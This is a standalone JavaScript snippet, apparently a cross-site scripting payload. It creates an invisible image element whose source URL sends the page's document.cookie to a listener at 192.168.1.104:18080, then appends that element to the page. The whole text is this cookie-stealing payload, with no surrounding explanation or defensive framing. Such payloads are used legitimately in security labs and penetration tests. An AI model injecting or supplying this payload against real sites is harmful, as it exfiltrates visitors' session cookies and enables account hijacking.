const img = document.createElement('img');
img.setAttribute('src', `http://192.168.1.104:18080/?c=${encodeURIComponent(document.cookie)}`);
img.style.display = 'none';
document.body.appendChild(img);

